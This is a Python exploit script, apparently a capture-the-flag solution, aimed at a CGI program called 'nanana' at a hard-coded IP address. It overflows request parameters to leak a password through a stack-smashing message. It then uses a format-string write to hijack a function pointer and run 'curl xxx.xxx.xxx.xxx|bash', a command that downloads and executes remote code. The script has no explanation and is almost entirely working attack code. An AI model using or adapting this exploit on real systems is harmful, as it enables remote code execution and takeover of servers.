#!/usr/bin/python
import requests
import struct

def p(x):
    return struct.pack('<Q', x)

URL = 'http://54.92.88.102/cgi-bin/nanana'

g_password = 0x601090

username = 'A' * (312 + 0x20 + 6)
password = 'A' * (312 + 0x40 + 5)
job = 'A' * (312 + 0x50 + 4)
action = 'A' * 312 + p(g_password)

params = {
    'username': username,
    'password': password,
    'job': job,
    'action': action,
}

r = requests.get(URL, params=params)

password = r.headers['*** stack smashing detected ***'].split()[0]
print 'password:', password

# overwrite last byte with c0
do_job_addr = 0x601048

cmd = 'curl xxx.xxx.xxx.xxx|bash'

username = cmd

job = p(do_job_addr)
action = '%' + str(0xc0) + 'x%15$hhn'

params = {
    'username': username,
    'password': password,
    'job': job,
    'action': action,
}

requests.get(URL, params=params)
